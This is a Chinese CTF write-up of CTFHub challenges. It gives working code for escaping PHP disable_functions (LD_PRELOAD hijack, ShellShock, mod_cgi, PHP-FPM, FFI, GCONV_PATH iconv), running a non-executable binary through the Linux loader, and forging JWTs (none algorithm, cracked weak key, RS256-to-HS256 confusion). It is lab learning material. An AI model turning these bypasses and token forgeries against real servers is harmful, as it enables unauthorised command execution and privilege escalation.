# CTFHUB进阶

[toc]

## 1. PHP Bypass disable_function

### 1.1 LD_PRELOAD

> 获取服务器上 /flag 文件中的 flag。需要了解 Linux LD_PRELOAD 环境变量。
>
> [【Linux】LD_PRELOAD用法 - 扫驴 - 博客园 (cnblogs.com)](https://www.cnblogs.com/saolv/p/9761371.html)
>
> [LD_PRELOAD用法_Lawrence_121-CSDN博客](https://blog.csdn.net/m0_37806112/article/details/80560235)
>
> 加载顺序为LD_PRELOAD>LD_LIBRARY_PATH>/etc/ld.so.cache>/lib>/usr/lib

进去之后可以看到已经给了一个webshell，但是这个webshell貌似不足以支持蚁剑使用交互式shell。

1. php中的error_log函数会使用geteuid函数。

2. 自己写一个hack.c文件里面包含geteuid函数，里面执行一些system函数去读取/flag文件。（本地编译上传）

    ```c
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
     
    uid_t geteuid(void){
    	if (getenv("LD_PRELOAD") == NULL) return 0;
    	unsetenv("LD_PRELOAD");
    	system("cat /flag >> /var/www/html/test");
    	system("tac /flag >> /var/www/html/test");
    }
    ```

    ```bash
    gcc -shared -fPIC hack.c -o hack.so
    ```

3. 通过更改LD_PRELOAD 环境变量把动态库的加载指向自己写的hack.so。

4. 自己写一个php文件调用error_log函数。

    ```php
    <?php
        putenv("LD_PRELOAD=/var/www/html/hack.so");
    	error_log("", 1);
    ```

5. 访问自己写的php文件，然后就能看到生成的test文件了，打开就能看见flag。

### 1.2 ShellShock

> 利用PHP破壳完成 Bypass
>
> [什么是ShellShock攻击？ - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/35579956)

这个依旧不能使用交互式shell，很多函数被禁用了（详情看phpinfo的**disable_functions**）。

现在的问题是如何导入环境变量，来执行类似的东西：`env x='() { :; }; echo vulnerable' bash -c "echo this is a test"`

仔细看了一下**disable_functions**发现并没有禁用putenv函数，那后面的操作就已经很简单了。

```php
<?php
    putenv("PHP_test=() { :; }; tac /flag >> test");
    error_log("",1);
```

为什么要用error_log函数：`error_log("",1);`是发送错误信息，但是用的是发送邮件的系统命令`sendmail`。

这里猜测，`sendmail`命令是Shell fork 出来的一个子程序，然后子程序继承了环境变量，直接触发了ShellShock。

### 1.3 Apache Mod CGI

> 1.Mod CGI就是把PHP做为APACHE一个内置模块，让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP.
> 2.它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行.
> 3.在.htaccess文件中可定制用户定义标识头
> 4.添加Options +ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本
> 5.添加AddHandler cgi-script .cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序
>
> .htaccess
>
> ```
> Options +ExecCGI
> AddHandler cgi-script .cgi
> ```

这个还是不能使用交互式shell。

shell.cgi:（需要给执行权限）

```bash
#! /bin/sh
echo; /readflag
```

> 这些文件都不要在windows上面编辑，换行符不一样会报错。

传上去之后直接访问shell.cgi即可。

### 1.4 PHP-FPM

> 正常情况下, PHP-FPM 是不会对外开放的。在有 webshell 之后，这就变得不一样了。学习通过攻击 PHP-FPM 达到 Bypass 的目的。
>
> [攻击PHP-FPM 实现Bypass Disable Functions - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true)

![image-20210809183338103](CTFHUB%E8%BF%9B%E9%98%B6.assets/image-20210809183338103.png)

运行插件之后，上传了一个`.antproxy.php`的文件。

```php
<?php
function get_client_header(){
    $headers=array();
    foreach($_SERVER as $k=>$v){
        if(strpos($k,'HTTP_')===0){
            $k=strtolower(preg_replace('/^HTTP/', '', $k));
            $k=preg_replace_callback('/_\w/','header_callback',$k);
            $k=preg_replace('/^_/','',$k);
            $k=str_replace('_','-',$k);
            if($k=='Host') continue;
            $headers[]="$k:$v";
        }
    }
    return $headers;
}
function header_callback($str){
    return strtoupper($str[0]);
}
function parseHeader($sResponse){
    list($headerstr,$sResponse)=explode("

",$sResponse, 2);
    $ret=array($headerstr,$sResponse);
    if(preg_match('/^HTTP/1.1 d{3}/', $sResponse)){
        $ret=parseHeader($sResponse);
    }
    return $ret;
}

set_time_limit(120);
$headers=get_client_header();
$host = "127.0.0.1";
$port = 62140;
$errno = '';
$errstr = '';
$timeout = 30;
$url = "/index.php";

if (!empty($_SERVER['QUERY_STRING'])){
    $url .= "?".$_SERVER['QUERY_STRING'];
};

$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
if(!$fp){
    return false;
}

$method = "GET";
$post_data = "";
if($_SERVER['REQUEST_METHOD']=='POST') {
    $method = "POST";
    $post_data = file_get_contents('php://input');
}

$out = $method." ".$url." HTTP/1.1\r\n";
$out .= "Host: ".$host.":".$port."\r\n";
if (!empty($_SERVER['CONTENT_TYPE'])) {
    $out .= "Content-Type: ".$_SERVER['CONTENT_TYPE']."\r\n";
}
$out .= "Content-length:".strlen($post_data)."\r\n";

$out .= implode("\r\n",$headers);
$out .= "\r\n\r\n";
$out .= "".$post_data;

fputs($fp, $out);

$response = '';
while($row=fread($fp, 4096)){
    $response .= $row;
}
fclose($fp);
$pos = strpos($response, "\r\n\r\n");
$response = substr($response, $pos+4);
echo $response;

```

然后连接这个shell就可以执行命令了。最后在命令行里面`tac /flag`就可以查看flag了。

### 1.5 GC UAF

> 理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function, 比如 GC UAF
>
> UAF: use after free。
>
> 我自己不会构造EXP，所以我直接**使用插件**，然后选择GC UAF，然后直接得到flag。

### 1.6 Json Serializer UAF

> 理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function, 比如 PHP #77843 Json Serializer UAF 漏洞。
>
> [PHP :: Bug #77843 :: Use after free with json serializer](https://bugs.php.net/bug.php?id=77843)
>
> 插件yyds。

### 1.7 Backtrace UAF

> 直接插件吧，UAF的exp确实不会构造。

### 1.8 FFI 扩展

> FFI 扩展已经通过RFC, 正式成为PHP7.4的捆绑扩展库, FFI 扩展允许 PHP 执行嵌入式 C 代码。
>
> [PHP FFI详解 - 一种全新的PHP扩展方式 - 风雪之隅 (laruence.com)](https://www.laruence.com/2020/03/11/5475.html)

```php
FFI::cdef([string $cdef = "" [, string $lib = null]]): FFI // 这里直接写入函数原型
static function load(string $filename): FFI; // 加载.h文件
```

这里可以直接用FFI调用一个标准库函数（当然也可以调用自己的函数，需要自己编译成so文件。）

```php
<?php
$ffi = FFI::cdef("int system(const char * string);"); // 这里需要找到system的函数原型
$ffi->system("tac /flag > /var/www/html/flag");
```

访问后即可获得flag。

### 1.9 iconv

> [使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客](https://blog.csdn.net/qq_42303523/article/details/117911859)

```c
// a.c
#include <stdio.h>
#include <stdlib.h>

void gconv() {}

void gconv_init() {
  system("tac /flag > /tmp/flag");
}
// gcc -shared -fPIC a.c -o abc.so
```

gconv-modules
```
module  ABC//    INTERNAL    ../../../../../../../../tmp/abc    2
module  INTERNAL    ABC//    ../../../../../../../../tmp/abc    2
```

```php
// a.php
<?php
    putenv("GCONV_PATH=/tmp/");
    iconv("abc", "UTF-8", "whatever");
?>
```

### 1.10 bypass iconv 1

这里iconv函数被过滤了。

![image-20210811105034832](CTFHUB%E8%BF%9B%E9%98%B6.assets/image-20210811105034832.png)

> [php中iconv函数用法详解介绍_PHP教程-php教程-PHP中文网](https://www.php.cn/php-weizijiaocheng-305277.html)

那根据上面的文章，可以换一个函数来使用。

```php
// a.php
<?php
    putenv("GCONV_PATH=/tmp/");
    iconv_substr("whatever", 1, 1, 'abc');
?>
```

### 1.11 bypass iconv 2

![image-20210811110834170](CTFHUB%E8%BF%9B%E9%98%B6.assets/image-20210811110834170.png)

这里iconv几乎所有的函数都被禁用了。

> [探索php://filter在实战当中的奇技淫巧 - linuxsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/linuxsec/articles/12684259.html)
>
> **convert.iconv.***
>
> 这个过滤器需要 php 支持 `iconv`，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用[iconv()](https://www.php.net/manual/zh/function.iconv.php)函数处理所有的流数据。
>
> 两种使用方法：
>
> ```
> convert.iconv.<input-encoding>.<output-encoding> 
> convert.iconv.<input-encoding>/<output-encoding>
> ```

```php
<?php
putenv("GCONV_PATH=/tmp/");
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'convert.iconv.abc.utf-8');
// fwrite($fp, "This is a test.n");
fclose($fp);
?>
```

## 2. Linux

### 2.1 动态加载器

> 学习 Linux ELF Dynaamic Loader 技术。在 ELF 无 x 权限时运行 ELF 文件。

![image-20210808154120921](CTFHUB%E8%BF%9B%E9%98%B6.assets/image-20210808154120921.png)

这里可以看到已经没有执行权限了，组也被更改了，也没有权限去chmod。

这里应该就是用给的webshell去动态装载程序。

 先去找一下文件在哪：

```bash
(www-data:/var/www/html) $ find "/readflag"
/readflag
(www-data:/var/www/html) $ ls -la /readflag
-rw-r--r-- 1 root root 8648 Mar  9  2020 /readflag
```

直接看elf信息`readelf -l /readflag`：

>  ELF 文件提供了相应的加载信息， GCC包含了一个特殊的 ELF 头： INTERP， 这个 INTERP指定了 加载器的路径，我们可以用readelf 来查看相应的程序

```bash
(www-data:/var/www/html) $ readelf -l /readflag
Elf file type is DYN (Shared object file)
Entry point 0x580
There are 9 program headers, starting at offset 64
Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000001f8 0x00000000000001f8  R E    0x8
  INTERP         0x0000000000000238 0x0000000000000238 0x0000000000000238
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x00000000000008b4 0x00000000000008b4  R E    0x200000
  LOAD           0x0000000000000dd8 0x0000000000200dd8 0x0000000000200dd8
                 0x0000000000000258 0x0000000000000260  RW     0x200000
  DYNAMIC        0x0000000000000df0 0x0000000000200df0 0x0000000000200df0
                 0x00000000000001e0 0x00000000000001e0  RW     0x8
  NOTE           0x0000000000000254 0x0000000000000254 0x0000000000000254
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_EH_FRAME   0x0000000000000768 0x0000000000000768 0x0000000000000768
                 0x000000000000003c 0x000000000000003c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000000dd8 0x0000000000200dd8 0x0000000000200dd8
                 0x0000000000000228 0x0000000000000228  R      0x1
 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
   08     .init_array .fini_array .jcr .dynamic .got 

```

可以看到有解释器：

```
 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
```

直接用解释器执行：

```bash
(www-data:/var/www/html) $ /lib64/ld-linux-x86-64.so.2 /readflag
ctfhub{07048b0c75ecfcdab722b9af}
```

## 3. JSON WEB TOKEN

### 3.1 基础知识

[基础知识讲解](https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob)

[JSON Web Tokens - jwt.io](https://jwt.io/)

### 3.2 敏感信息泄露

这里直接admin/admin登陆进去，然后在cookie里找到token。

![image-20210808163312651](CTFHUB%E8%BF%9B%E9%98%B6.assets/image-20210808163312651.png)

得到flag：`ctfhub{a954fc41c255af77e5c2ab4d}`

### 3.3 无签名

> 一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。

还是先使用admin登陆进去。

![image-20210808165509225](CTFHUB%E8%BF%9B%E9%98%B6.assets/image-20210808165509225.png)

这里估计是要把role改成admin，然后还要顺利通过验证。

这里将alg改成空，然后role改成admin。

> 这里有个需要注意的地方：最后构造的token最后一段不能有值，但是必须把最后一段标记出来。也就是说，我们构造的token最后要留一个`.`

```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIsCiAgInBhc3N3b3JkIjogImFkbWluIiwKICAicm9sZSI6ICJhZG1pbiIKfQ.
```

得到flag：`ctfhub{a4c5bb424d772731c77c84a4}`

### 3.4 弱密钥

这里使用`c-jwt-cracker-master`进行爆破。

[brendan-rius/c-jwt-cracker: JWT brute force cracker written in C (github.com)](https://github.com/brendan-rius/c-jwt-cracker)

跑出来结果：

```
docker build . -t jwtcrack
docker run -it --rm jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJndWVzdCJ9.aCHZ32oagp2J2-tyub6C5_Qr_p8RBzrT8cNcQLbbzVw
Secret is "dzqi"
```

直接构造token。

![image-20210808172932233](CTFHUB%E8%BF%9B%E9%98%B6.assets/image-20210808172932233.png)

拿到flag：`ctfhub{2155a05324a12c8f756f5519}`。

### 3.5 修改签名算法

> 有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。

```php
<?php
require __DIR__ . '/vendor/autoload.php';
use \Firebase\JWT\JWT;

class JWTHelper {
  public static function encode($payload=array(), $key='', $alg='HS256') {
    return JWT::encode($payload, $key, $alg);
  }
  public static function decode($token, $key, $alg='HS256') {
    try{
            $header = JWTHelper::getHeader($token);
            $algs = array_merge(array($header->alg, $alg));
      return JWT::decode($token, $key, $algs);
    } catch(Exception $e){
      return false;
    }
    }
    public static function getHeader($jwt) {
        $tks = explode('.', $jwt);
        list($headb64, $bodyb64, $cryptob64) = $tks;
        $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));
        return $header;
    }
}

$FLAG = getenv("FLAG");
$PRIVATE_KEY = file_get_contents("/privatekey.pem");
$PUBLIC_KEY = file_get_contents("./publickey.pem");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        $token = "";
        if($_POST['username'] === 'admin' && $_POST['password'] === $FLAG){
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'admin',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        } else {
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'guest',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        }
        @setcookie("token", $token, time()+1800);
        header("Location: /index.php");
        exit();
    } else {
        @setcookie("token", "");
        header("Location: /index.php");
        exit();
    }
} else {
    if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) {
        $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);
        if ($obj->role === 'admin') {
            echo $FLAG;
        }
    } else {
        show_source(__FILE__);
    }
}
?>
```

先**审计代码**：

1. 首先这里不用使用POST方法，所以使用GET方法访问index.php。

2. 然后就是`if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false)`

    这里需要cookie里的token不为空，还需要token能被`$PUBLIC_KEY`解码。

3. 转到`JWTHelper`，这里默认`alg`是`HS256`，然后`key`用的是`PUBLIC_KEY`，而`PUBLIC_KEY`就是能看到的那个`publickey.pem`。

这道题目需要自己**搭建环境**去构造token，因为你不管用什么方法，都没法在`jwt.io`上面跑出来。

而我认为搭建环境才是最难的。

在我看了**无数个composer的文档**，发现都不能执行`require`的时候，我就放弃了composer。

步骤：（Ubuntu环境，请先自行下载php：`sudo apt install php7.4-cli`）

1. 目录结构。

```
.
├── a.php
├── publickey.pem
└── src
    ├── BeforeValidException.php
    ├── ExpiredException.php
    ├── JWK.php
    ├── JWT.php
    └── SignatureInvalidException.php
```

2. 直接下载[firebase\php-jwt](https://github.com/firebase/php-jwt)，可以只保留src的文件夹。

3. 然后下载publickey.pem文件。

    `wget http://challenge-09006cfda4a145e7.sandbox.ctfhub.com:10800/publickey.pem`

4. 然后自己编写php文件，我这里是随便起的名字`a.php`。

    ```php
    <?php
    include "./src/JWT.php";
    use \Firebase\JWT\JWT;
    
    // 这里是网站上的那部分代码
    class JWTHelper {
        public static function encode($payload=array(), $key='', $alg='HS256') {
            return JWT::encode($payload, $key, $alg);
        }
        public static function decode($token, $key, $alg='HS256') {
            try{
                $header = JWTHelper::getHeader($token);
                $algs = array_merge(array($header->alg, $alg));
                return JWT::decode($token, $key, $algs);
            } catch(Exception $e){
                return false;
            }
        }
        public static function getHeader($jwt) {
            $tks = explode('.', $jwt);
            list($headb64, $bodyb64, $cryptob64) = $tks;
            $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));
            return $header;
        }
    }
    
    // 导入public key
    $PUBLIC_KEY = file_get_contents("./publickey.pem");
    
    $payload=array("username"=>"admin", "role"=>"admin");
    $encoder=JWT::encode($payload, $PUBLIC_KEY);
    var_dump($encoder);//输出token值
    
    // 验证是否成功
    if(!empty($encoder) && JWTHelper::decode($encoder, $PUBLIC_KEY) != false)
    {
        $obj = JWTHelper::decode($encoder, $PUBLIC_KEY);
    
        if ($obj->role === 'admin') {
            echo "ok\n";
        }
        else{
            echo "not admin\n";
        }
    }
    else {
        echo "error\n";
    }
    ```

5. 执行自己的php文件。`php a.php`

    执行之后就可以得到token了，也可以知道是否能通过测试。

![image-20210808222341057](CTFHUB%E8%BF%9B%E9%98%B6.assets/image-20210808222341057.png)

​	之后替换token就可以了。
